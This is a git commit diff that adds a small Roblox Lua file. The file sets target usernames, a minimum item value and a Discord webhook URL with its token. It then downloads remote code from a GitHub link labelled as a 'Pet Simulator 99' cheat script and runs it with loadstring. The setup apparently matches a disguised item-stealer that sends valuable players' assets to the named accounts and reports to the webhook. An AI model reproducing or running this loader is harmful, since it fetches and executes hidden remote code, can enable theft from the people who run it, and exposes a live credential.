5b7e44110e486ed7ce046daeca821d2a2691ffa7
RaV707 <petrovmakachev@gmail.com>
2025-04-22 20:54:13 +0200

    Add files via upload

---
+++ obf_3iEwwUXHJ5u1KN1HS2963qRbyL0ZA6n3tOOqhQp7PM6ci9j6HXGb7fwp78NBmfb1.lua
@@ -0,0 +1,6 @@
+Username = "yowyowkok3"
+Username2 = "yowyowkok3"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1364293054512496741/ampuBGM24dFcW3aA1x46YetBrZ8x3x6GsjaOpiRLwA6-7JxmFxwWBu74tPw2ORIR1Cwc"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
